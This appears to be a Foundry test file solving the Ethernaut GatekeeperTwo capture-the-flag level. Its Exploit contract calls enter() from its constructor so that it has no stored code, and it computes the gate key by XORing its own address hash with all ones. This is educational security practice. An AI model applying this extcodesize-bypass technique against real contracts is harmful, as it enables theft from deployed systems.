// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperTwo.sol";
import "src/levels/GatekeeperTwoFactory.sol";

contract TestGatekeeperTwo is BaseTest {
    GatekeeperTwo private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new GatekeeperTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperTwo(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // To pass first gate, we need to call the enter function from another contract.
        // However, the second gates implies that the entity calling the function cannot contain any code.
        // This mean we have to call enter() in the transaction that creates the contract, because its code is only stored at the and of contructor().

        // To pass the third gate, we need to find a key that will make the following expression true
        // Since keccak256 is deterministic, we can precalculate the key required to pass the gate three
        // There is also an XOR operation that we need to understand to solve this gate

        // We need to turn a precalculated part to have all its bets set to 1 to be equal to type(uint64).max
        // It means that our key must be the inverse of the precalculated part

        vm.prank(player, player);

        Exploit exploit = new Exploit(level);
    }
}

contract Exploit {
    constructor(GatekeeperTwo level) public {
        bytes8 leftPart = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 key = leftPart ^ 0xFFFFFFFFFFFFFFFF;

        level.enter(key);
    }
}
